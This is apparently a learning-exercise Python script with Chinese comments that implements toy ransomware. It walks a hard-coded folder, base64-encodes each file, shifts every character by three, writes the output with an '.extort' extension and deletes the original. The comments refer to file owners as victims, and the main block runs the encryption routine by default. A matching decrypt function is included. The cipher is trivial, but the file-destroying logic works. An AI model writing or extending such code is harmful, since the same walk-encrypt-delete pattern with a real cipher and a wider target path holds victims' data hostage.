import base64
import os


def get_files():  # 获取文件夹下的所有文件的绝对路径
    filenames1 = []
    for filepath, dirnames, filenames in os.walk(r'E:\PycharmProjects\pythonProject\learn\test'):  # 遍历文件夹下的所有内容
        for filename in filenames:
            filenames1.append(os.path.join(filepath, filename))  # 获取绝对路径
    return filenames1


def get_files_base64():  # 获取所有文件的base64编码
    source = []
    filenames = get_files()
    for i in range(len(filenames)):
        with open(f"{filenames[i]}", 'rb') as file:
            content = file.read()
            source.append(base64.b64encode(content).decode())
    return source


def get_extort_files_content():  # 获取所有加密文件的内容
    source = []
    filenames = get_files()
    for i in range(len(filenames)):
        with open(f"{filenames[i]}", mode='r') as file:  # 因为是用base64编码写入的，所以直接读取源码
            content = file.read()
            source.append(content)
    return source


def do_encrypt():  # 开始加密
    filenames = get_files()
    source = get_files_base64()
    for i in range(len(filenames)):
        with open(f"{filenames[i]}" + '.extort', 'wb') as file:
            new = ''
            for s in source[i]:
                new += chr(ord(s) + 3)  # 加密方式：ascii+3
            file.write(new.encode())  # 写入的是b64编码
        os.remove(filenames[i])  # 删除源文件


def do_decrypt():  # 开始解密
    filenames = []  # 受害者之前的名字
    filenames_extort = get_files()  # 获取的受害者名字
    source = get_extort_files_content()  # 加密内容，b64
    for f in range(len(filenames_extort)):
        filename = filenames_extort[f].replace('.extort', '')  # 将文件后缀.extort取消
        filenames.append(filename)
    for i in range(len(filenames)):
        with open(f"{filenames[i]}", 'wb') as file:
            new = ''
            for s in source[i]:
                new += chr(ord(s) - 3)
            file.write(base64.b64decode(new))  # 拿掉b64，以原本的内容放进去
        os.remove(filenames_extort[i])


if __name__ == '__main__':
    do_encrypt()
    # do_decrypt()
